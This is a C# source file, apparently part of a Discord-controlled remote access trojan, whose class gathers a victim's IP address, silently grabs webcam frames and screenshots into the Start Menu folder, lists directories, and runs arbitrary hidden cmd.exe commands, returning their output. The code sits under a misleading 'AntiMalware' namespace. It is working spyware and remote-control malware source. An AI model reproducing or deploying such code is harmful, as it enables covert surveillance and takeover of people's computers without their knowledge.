using System.Net.Sockets;
using System.Net;
using OpenCvSharp;
using System.Drawing;
using System.Windows;
using System.Drawing.Imaging;
using Discord.WebSocket;
using System.Diagnostics;
// 시스템정보 화면등등을 가져오기위해 만든 클래스
// make by root1234567891234 as sillo
// 주석 지우지 마세요

namespace AntiMalware
{
    internal class GET
    {
        private text text = new text();
        // ip를 가져온다. 실패했을시 error을 return한다.
        public string ip()
        {
            try
            {
                var host = Dns.GetHostEntry(Dns.GetHostName());
                foreach (var ip in host.AddressList)
                {
                    if (ip.AddressFamily == AddressFamily.InterNetwork)
                    {
                        return ip.ToString();
                    }
                }
                return "error";
            }
            catch
            {
                return "error";
            }
        }
        // 웹캠을 가져온다.
        // ..\AppData\Roaming\Microsoft\Windows\Start Menu 에 camshot.jpg를 저장후 그 경로를 return한다.
        // 같은 경로에 이미지가 이미있을시 삭제후 가져온다.
        public string camera()
        { 
            string path = Environment.GetFolderPath(Environment.SpecialFolder.StartMenu);
            VideoCapture video = new VideoCapture(0);
            Mat frame = new Mat();
            video.Read(frame);
            FileInfo f1 = new FileInfo(path + "\\camshot.jpg");
            try
            {
                if (f1.Exists)
                {
                    f1.Delete();
                }
            }
            catch { }
            frame.SaveImage(path + "\\camshot.jpg"); ;
            return path + "\\camshot.jpg";
        }
        // cmd 의 dir과 같은 함수
        public List<string> dic(string path)
        {
            DirectoryInfo di = new DirectoryInfo(path);
            List<string> dic = new List<string>();
            foreach (FileInfo File in di.GetFiles())
            {
                dic.Add(File.Name + "\n");
            }

            foreach (DirectoryInfo sub_Dir in di.GetDirectories())
            {
                dic.Add("[" + sub_Dir.Name + "]" + "\n");
            }
            return dic;
        }
        // 스크린샷을 가져온다.
        // ..\AppData\Roaming\Microsoft\Windows\Start Menu 에 camshot.jpg를 저장후 그 경로를 return한다.
        // 같은 경로에 이미지가 이미있을시 삭제후 가져온다.
        public string screenshot()
        {
            Console.WriteLine(SystemParameters.FullPrimaryScreenHeight.ToString() + " " + SystemParameters.FullPrimaryScreenWidth.ToString());
            Bitmap screenshot = new Bitmap(Convert.ToInt32(SystemParameters.FullPrimaryScreenWidth), Convert.ToInt32(SystemParameters.FullPrimaryScreenHeight) + 100, PixelFormat.Format32bppArgb);
            using (Graphics gr = Graphics.FromImage(screenshot))
            {
                gr.CopyFromScreen(0, 0, 0, 0, screenshot.Size);
            }
            string path = Environment.GetFolderPath(Environment.SpecialFolder.StartMenu);
            FileInfo f1 = new FileInfo(path + "\\screenshot.jpg");
            try
            {
                if (f1.Exists)
                {
                    f1.Delete();
                }
            }
            catch
            {
            }
            Bitmap s = new Bitmap(screenshot);
            s.Save(path + "\\screenshot.jpg");
            return path + "\\screenshot.jpg";
        }
        // cmd에 명령을 내린후 그결과값을 return한다.
        public string[] cmd(SocketUserMessage message,string input)
        {
            Process command = new Process();
            command.StartInfo.FileName = "cmd.exe";
            command.StartInfo.Arguments = "/c" + input;
            command.StartInfo.RedirectStandardOutput = true;
            command.StartInfo.UseShellExecute = false;
            command.StartInfo.CreateNoWindow = true;
            command.StartInfo.RedirectStandardError = true;
            command.StartInfo.RedirectStandardInput = true;
            command.Start();
            string[] output =
            {
                command.StandardOutput.ReadToEnd(),
                command.StandardError.ReadToEnd()
            };
            command.Close();
            return output;
        }
    }
}
